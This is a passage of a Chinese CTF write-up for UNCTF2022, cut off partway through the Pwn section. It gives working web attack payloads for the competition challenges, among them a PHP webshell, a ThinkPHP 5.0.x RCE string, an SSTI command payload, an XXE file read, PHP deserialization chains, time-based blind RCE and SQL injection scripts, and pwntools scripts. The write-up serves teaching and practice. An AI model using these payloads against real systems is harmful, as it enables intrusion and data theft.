    <content type="html"><![CDATA[<p>​    </p><p>为深入贯彻习近平总书记关于二十大提出的网络强国的重要思想，围绕建设网络强国的战略部署，建设网络强国的战略部署要与“两个一百年”奋斗目标同步推进，由御之安承办UNCTF2022网络安全大赛（以下简称“大赛”）将于今年11月份召开，以赛事为契机，提升网络安全保障能力，汇聚高端网络安全人才，共筑网络安全防线，为中国网络安全事业发展提供智力支撑和保障。</p><p>线上报名：2022年10月24日10:00-11月11日10:00，比赛时间：2022年11月12日12:00-11月18日12:00</p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="# Web"></a># Web</h2><h3 id="我太喜欢bilibili大学啦"><a href="#我太喜欢bilibili大学啦" class="headerlink" title="我太喜欢bilibili大学啦"></a>我太喜欢bilibili大学啦</h3><p>phpinfo页面环境变量中直接泄露flag。</p><p>​    </p><h3 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h3><blockquote><p>简单的游戏~ 打过boss就能获得flag</p></blockquote><p>F12查看js，在main.js里搜索 <code>unctf</code>，在混淆js代码中找到flag片段，连接起来得：<code>unctf&#123;c5f9a27d-6f88-49fb-a510-fe7b163f8dd3&#125;</code>。</p><p>​    </p><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>又是一道简单的签到</p></blockquote><p>F12发现注释有学号 <code>20200101</code> 为账号密码，尝试 <code>20200102/20200103/20200104/20200105</code> 分别回显 <code>f/l/a/g</code>，脚本遍历提取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://365172a3-2701-4e1a-8f59-a548f14e7027.node.yuzhian.com.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20200102</span>,<span class="number">20200102</span>+<span class="number">40</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url,data=data)</span><br><span class="line">    flag += r.text[-<span class="number">5</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>弱类型比较。第一层，16进制0x绕过；第二层，数组绕过；第三层，用其他命令和通配符绕过RCE。</p><p>Payload：</p><p><code>/index.php?code=print_r(exec(&quot;uniq%09/fl*&quot;));</code>，POST：<code>a=0x&amp;key1[]=a&amp;key2[]=b</code></p><p>​    </p><h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><blockquote><p>简简单单的文件上传</p></blockquote><p>无过滤的文件上传。上传一个 <code>1.php</code>，内含 <code>&lt;?php system($_GET[x]);</code>，再访问传入命令RCE。</p><p>Payload：<code>/uplO4d/1.php?x=cat%20/home/ctf/flag</code></p><p>​    </p><h3 id="给你一刀"><a href="#给你一刀" class="headerlink" title="给你一刀"></a>给你一刀</h3><p>ThinkPHP 5.0.x未开启强制路由RCE漏洞。</p><p>Payload: <code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=env</code></p><p>flag: <code>UNCTF&#123;Y0u_A3r_so_G9eaD_hacker&#125;</code></p><p>​    </p><h3 id="302与深大"><a href="#302与深大" class="headerlink" title="302与深大"></a>302与深大</h3><blockquote><p>thai想让你知道szu的战队……吗，醒醒，这个页面不是主页！</p></blockquote><p>Request头的考察。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?miku=puppy</span><br><span class="line">POST: micgo=ikun</span><br><span class="line">Cookie: admin=true</span><br></pre></td></tr></table></figure><p>flag: <code>UNCTF&#123;thai_miku_micgo_qka_WEB_GOD&#125;</code></p><p>​    </p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy ssti"></a>easy ssti</h3><blockquote><p>php看腻了，来点python吧</p></blockquote><p>基本无过滤的SSTI。</p><p>Payload：</p><p><code>/register</code>，POST：<code>user=&#123;&#123;cycler.__init__.__globals__.os.popen('env').read()&#125;&#125;&amp;pwd=</code></p><p>​    </p><h3 id="听说php有一个xxe"><a href="#听说php有一个xxe" class="headerlink" title="听说php有一个xxe"></a>听说php有一个xxe</h3><p>XXE。先访问 <code>/hint</code>，再访问 <code>/dom.php</code>，根据 <code>DOMDocument::loadXML()</code>信息，POST一个XML数据读flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezunseri"><a href="#ezunseri" class="headerlink" title="ezunseri"></a>ezunseri</h3><blockquote><p>好像还没有反序列化的题目？</p></blockquote><p>反序列化链：<code>Login:__destruct() =&gt; Exec:__get() =&gt; Test:__toString() =&gt; Exec:__invoke() =&gt; Exec:execute()</code></p><p>构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exec</span>:</span></span><br><span class="line">    public_content=<span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>:</span></span><br><span class="line">    public_test=Exec()</span><br><span class="line">    public_key=<span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exec</span>:</span></span><br><span class="line">    public_content=Test()</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span>:</span></span><br><span class="line">    private_name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    public_code=<span class="string">&#x27;3.1415926&#x27;</span></span><br><span class="line">    public_key=Exec()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(Login())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A5%3A%22Login%22%3A3%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># 绕__wakeup():</span></span><br><span class="line"><span class="comment"># O%3A5%3A%22Login%22%3A4%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="poppop"><a href="#poppop" class="headerlink" title="poppop"></a>poppop</h3><p>反序列化链：<code>B:__destruct() =&gt; C:__toString() =&gt; A:__call()</code></p><p>构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    public_code=<span class="string">&#x27;system(&quot;env&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span></span><br><span class="line">    private_key2=A()</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    public_key=C()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(quote(serialize(B())))</span><br><span class="line">      </span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A1%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D</span></span><br><span class="line"><span class="comment"># 绕__wakeup():</span></span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A2%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babynode"><a href="#babynode" class="headerlink" title="babynode"></a>babynode</h3><blockquote><p>你能污染对象吗</p></blockquote><p>原型链污染。</p><p>Payload：</p><p>POST： <code>&#123;&quot;__proto__&quot;:&#123;&quot;id&quot;:&quot;unctf&quot;&#125;&#125;</code></p><p>​    </p><h3 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h3><blockquote><p>rce布尔盲注</p></blockquote><p>无回显RCE，可以采用 <code>if+head+cut+sleep</code> 方式逐位猜解flag各个字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://c88b47e2-7088-4011-8d20-f4e5677e765e.node.yuzhian.com.cn/?code=&#x27;</span></span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;&#123;-&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    judge = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        now = <span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>a=$(tac /f?ag | head -1 | cut -b <span class="subst">&#123;i&#125;</span>)%0aif [ $a = <span class="subst">&#123;j&#125;</span> ]%0athen sleep 2%0afi&#x27;</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.get(now)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(end)-<span class="built_in">int</span>(start) &gt; <span class="number">1</span>:</span><br><span class="line">            judge = <span class="number">1</span></span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> judge == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><blockquote><p>好像见过，又好像不是</p></blockquote><p>sqlmap能跑出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> -D ctftraining --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> -D ctftraining -T FLAG_TABLE --sql-shell</span><br><span class="line"></span><br><span class="line">sql-shell&gt; select load_file(<span class="string">&quot;/flag&quot;</span>);</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ez2048"><a href="#ez2048" class="headerlink" title="ez2048"></a>ez2048</h3><p>F12在game.js内查看关键代码，为首页invite_code验证逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">checkInvited</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> args = [...arguments];</span><br><span class="line">    <span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">const</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line">    view.setUint8(<span class="number">0</span>, <span class="number">68</span>);</span><br><span class="line">    view.setUint8(<span class="number">1</span>, <span class="number">51</span>);</span><br><span class="line">    view.setUint8(<span class="number">2</span>, <span class="number">15</span>);</span><br><span class="line">    view.setUint8(<span class="number">3</span>, <span class="number">80</span>);</span><br><span class="line">    view.setUint16(<span class="number">4</span>, <span class="number">0x0e5d</span>, <span class="literal">true</span>);</span><br><span class="line">    view.setUint16(<span class="number">6</span>, <span class="number">0x323a</span>, <span class="literal">true</span>);</span><br><span class="line">    view.setUint16(<span class="number">8</span>, <span class="number">0x3058</span>, <span class="literal">true</span>);</span><br><span class="line">    view.setUint16(<span class="number">10</span>, <span class="number">0x1a2a</span>, <span class="literal">true</span>);</span><br><span class="line">    view.setUint32(<span class="number">12</span>, <span class="number">0x0512160d</span>, <span class="literal">true</span>);</span><br><span class="line">    view.setUint32(<span class="number">16</span>, <span class="number">0x02560002</span>);</span><br><span class="line">    view.setUint32(<span class="number">20</span>, <span class="number">0x130000</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (code.length !== <span class="number">24</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">let</span> encode = [];</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; code.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (~i % <span class="number">2</span> === <span class="number">0</span>) &#123;</span><br><span class="line">          encode.push(code.charCodeAt(i) ^ code.charCodeAt(i - <span class="number">2</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          encode.push(code.charCodeAt(i) ^ code.charCodeAt(i + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; code.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (view.getInt8(i) !== encode[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!!<span class="built_in">arguments</span>.length) &#123;</span><br><span class="line">        [].push.apply(args, <span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">arguments</span>.callee;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> check(args.join(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>写简单脚本还原输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">68</span>,<span class="number">51</span>,<span class="number">15</span>,<span class="number">80</span>,<span class="number">93</span>,<span class="number">14</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">88</span>,<span class="number">48</span>,<span class="number">42</span>,<span class="number">26</span>,<span class="number">13</span>,<span class="number">22</span>,<span class="number">18</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">86</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">19</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line"></span><br><span class="line">t = [-<span class="number">1</span>]*<span class="number">24</span></span><br><span class="line">t[<span class="number">1</span>] = c[<span class="number">1</span>]</span><br><span class="line">t[<span class="number">0</span>] = t[<span class="number">1</span>]^c[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">24</span>,<span class="number">2</span>):</span><br><span class="line">  t[i] = t[i-<span class="number">2</span>]^c[i]</span><br><span class="line">  t[i-<span class="number">1</span>] = t[i]^c[i-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;w3lc0me_7o_unctf2022!!!!&#x27;</span></span><br></pre></td></tr></table></figure><p>再观察发现存在game.wasm，使用wabt工具逆wasm得到密文 <code>\x22&#125;/7v\x16\x0d&gt;GV&amp;*\x5cS@^mWS_D~V\x10\x03[3\x16^\x0eR9\x05_mG\x10\x1efalse\x00</code>，尝试与前面得到的invite_code异或，得到 <code>UNCTF&#123;hap9y_2048_game_w1th_unc7f2022~&#125;..^CW2</code>。</p><p>​    </p><h3 id="世界和平"><a href="#世界和平" class="headerlink" title="世界和平"></a>世界和平</h3><blockquote><p>提示1：堆叠注入</p></blockquote><p>根据提示进行堆叠注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0;show databases;#</span><br><span class="line">数据库名 score_mbamission/score_minnesotaunited/snert</span><br><span class="line"></span><br><span class="line">0;show tables;# </span><br><span class="line">表名 Flag/users</span><br></pre></td></tr></table></figure><p>使用 <code>0;select * from Flag</code> 查找Flag表中内容，发现无回显，猜测对 <code>select</code> 或 <code>from</code> 或 <code>Flag</code> 有过滤。</p><p>尝试 <code>0;seLseLectect version();#</code>，只用 <code>select</code> 大写+双写可以绕过得到内容，则</p><p>再用 <code>0;seLseLectect * fRfRomom FlFlagag;#</code> 即可拿到flag。</p><p>​    </p><h3 id="快乐三消"><a href="#快乐三消" class="headerlink" title="快乐三消"></a>快乐三消</h3><blockquote><p>打CTF累了来玩三消放松一下叭</p></blockquote><p>查看源码，除了进入 <code>/h5/index.php</code> 和 <code>/h4/king.php</code>，没有其他有用信息。</p><p>扫目录发现 <code>/.git/</code> 和 <code>/admin/</code>，用GitHack还原出 <code>index.php</code> 和 <code>phpinfo.php</code>，无有用信息。</p><p>用 <code>admin/unctf</code> 进入后台页面， 在网页预览功能发现url为 <code>/admin/fi.php?filename=index.php</code>，尝试发现存在文件包含漏洞，访问 <code>/admin/fi.php?filename=/flag</code> 得到flag。</p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="# Pwn"></a># Pwn</h2><h3 id="welcomeUNCTF2022"><a href="#welcomeUNCTF2022" class="headerlink" title="welcomeUNCTF2022"></a>welcomeUNCTF2022</h3><blockquote><p>easy easy easy Pwn</p></blockquote><p>签到pwn。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">37591</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;UNCTF&amp;2022\x00&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h3><p>伪随机数组，给了srand种子值，依照代码逻辑求出固定种子值下的100个rand值：</p><p><code>[1,1,2,2,0,2,2,1,2,2,2,2,0,0,2,1,0,1,2,0,0,1,1,1,1,2,1,1,1,0,0,2,0,1,2,0,0,1,0,2,1,2,1,2,0,1,1,1,0,0,2,0,2,1,2,1,0,0,2,2,1,1,2,1,2,2,2,2,1,0,2,0,2,0,0,1,2,2,2,0,0,1,0,1,0,0,2,0,1,0,0,2,1,1,1,1,0,1,1,2]</code></p><p>再根据石头剪刀布规则完成后半部分交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">30253</span>)</span><br><span class="line">rand = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">need = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> rand[i] == <span class="number">0</span>:</span><br><span class="line">        need.append(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> rand[i] == <span class="number">1</span>:</span><br><span class="line">        need.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> rand[i] == <span class="number">2</span>:</span><br><span class="line">        need.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;pwn later?(y/n)\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;]\x1B[0m\n&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(need[i]))</span><br><span class="line">    <span class="built_in">print</span>(i,r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>测试符合条件的数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 